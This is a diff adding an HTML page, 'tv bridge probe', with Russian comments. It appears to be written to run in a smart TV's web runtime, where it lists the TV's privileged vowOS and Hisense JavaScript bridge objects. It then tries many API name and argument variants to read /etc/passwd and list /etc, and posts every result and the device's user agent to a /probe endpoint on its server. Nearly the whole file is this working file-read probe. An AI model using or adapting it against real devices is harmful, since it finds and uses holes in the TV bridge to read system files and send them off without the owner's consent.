@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>tv bridge probe</title>
+<style>
+ body{font:18px/1.4 sans-serif;background:#111;color:#eee;margin:0;padding:20px}
+ h1{font-size:20px;margin:0 0 10px}
+ #log{white-space:pre-wrap;font-family:monospace;font-size:14px}
+ .ok{color:#6f6}.bad{color:#f66}.dim{color:#888}
+</style>
+</head>
+<body>
+<h1>tv bridge probe <small class="dim">read-only</small></h1>
+<div id="log"></div>
+<script>
+/* Разовая диагностика моста. Ничего не пишет на диск телевизора:
+   только get-вызовы и чтение файлов. */
+var API = "";
+var results = [];
+
+function log(msg, cls) {
+  var el = document.getElementById("log");
+  var d = document.createElement("div");
+  if (cls) d.className = cls;
+  d.textContent = msg;
+  el.appendChild(d);
+}
+function post(path, obj, cb) {
+  try {
+    var x = new XMLHttpRequest();
+    x.open("POST", API + path, true);
+    x.setRequestHeader("Content-Type", "application/json");
+    x.onreadystatechange = function () { if (x.readyState === 4 && cb) cb(x.status); };
+    x.send(JSON.stringify(obj));
+  } catch (e) { if (cb) cb(0); }
+}
+function short(v) {
+  try {
+    if (typeof v === "string") return v.slice(0, 300);
+    return JSON.stringify(v).slice(0, 400);
+  } catch (e) { return String(v).slice(0, 200); }
+}
+/* каждый тест: имя, чем звать, что вернулось или чем упало */
+function probe(label, fn) {
+  var rec = { label: label, ok: false, value: null, error: null };
+  try {
+    var r = fn();
+    rec.ok = true;
+    rec.value = short(r);
+  } catch (e) { rec.error = String(e && e.message || e); }
+  results.push(rec);
+  log((rec.ok ? "ok   " : "fail ") + label + " -> " + (rec.ok ? rec.value : rec.error), rec.ok ? "ok" : "bad");
+  return rec;
+}
+function keysOf(o, n) {
+  try {
+    if (!o) return null;
+    var out = [];
+    for (var k in o) { out.push(k); if (out.length >= (n || 60)) break; }
+    return out;
+  } catch (e) { return "err:" + e; }
+}
+
+/* ---------- 1. окружение ---------- */
+probe("typeof vowOS", function () { return typeof window.vowOS; });
+probe("typeof vowOS.service", function () { return typeof (window.vowOS && window.vowOS.service); });
+probe("vowOS keys", function () { return keysOf(window.vowOS); });
+probe("vowOS.service keys", function () { return keysOf(window.vowOS && window.vowOS.service); });
+probe("typeof syncExecute", function () {
+  return typeof (window.vowOS && window.vowOS.service && window.vowOS.service.syncExecute);
+});
+probe("typeof omi_platform", function () { return typeof window.omi_platform; });
+probe("omi_platform keys", function () { return keysOf(window.omi_platform); });
+probe("typeof TvInfo_getParam", function () { return typeof window.TvInfo_getParam; });
+probe("typeof HiUtils_createRequest", function () { return typeof window.HiUtils_createRequest; });
+probe("typeof window.File", function () { return typeof window.File; });
+probe("typeof Hisense_FileRead", function () { return typeof window.Hisense_FileRead; });
+probe("typeof Hisense_installApp", function () { return typeof window.Hisense_installApp; });
+
+/* ---------- 2. мост работает вообще? ---------- */
+probe("hiutils getOSVersion", function () { return window.HiUtils_createRequest("getOSVersion"); });
+probe("hiutils getVersionStatus", function () { return window.HiUtils_createRequest("getVersionStatus"); });
+probe("hiutils deviceCode", function () { return window.HiUtils_createRequest("deviceCode"); });
+
+/* ---------- 3. чтение файла разными формами аргумента ---------- */
+var TARGET = "/etc/passwd";
+var variants = [
+  ["fileRead(string)",      function () { return window.HiUtils_createRequest("fileRead", TARGET); }],
+  ["fileRead({path})",      function () { return window.HiUtils_createRequest("fileRead", { path: TARGET }); }],
+  ["fileRead({filePath})",  function () { return window.HiUtils_createRequest("fileRead", { filePath: TARGET }); }],
+  ["fileRead({filename})",  function () { return window.HiUtils_createRequest("fileRead", { filename: TARGET }); }],
+  ["readFile(string)",      function () { return window.HiUtils_createRequest("readFile", TARGET); }],
+  ["getFile(string)",       function () { return window.HiUtils_createRequest("getFile", TARGET); }],
+  ["readfile(string)",      function () { return window.HiUtils_createRequest("readfile", TARGET); }],
+  ["file_read(string)",     function () { return window.HiUtils_createRequest("file_read", TARGET); }],
+  ["getFileContent(string)",function () { return window.HiUtils_createRequest("getFileContent", TARGET); }]
+];
+for (var i = 0; i < variants.length; i++) probe(variants[i][0], variants[i][1]);
+
+/* прямой вызов службы, минуя обёртку */
+probe("syncExecute hiutils/fileRead", function () {
+  return window.vowOS.service.syncExecute("hiutils", { api: "fileRead", args: TARGET });
+});
+probe("syncExecute hiutils/getFileList", function () {
+  return window.vowOS.service.syncExecute("hiutils", { api: "getFileList", args: "/etc" });
+});
+
+/* ---------- 4. tvapi (только чтение) ---------- */
+probe("tvapi ready", function () { return typeof window.tvapi; });
+probe("syncExecute tvapi/get",
+  function () { return window.vowOS.service.syncExecute("tvapi", { api: "vint32.servicemode.tunerinfo.signallevels" }); });
+
+/* ---------- 5. отправка ---------- */
+function finish() {
+  var payload = {
+    name: "bridge",
+    userAgent: navigator.userAgent,
+    ts: new Date().toISOString(),
+    tests: results
+  };
+  log("отправка результатов…", "dim");
+  post("/probe", payload, function (st) {
+    log(st === 200 ? "отправлено, можно закрывать" : "ошибка отправки: " + st, st === 200 ? "ok" : "bad");
+  });
+}
+finish();
+</script>
+</body>
+</html>
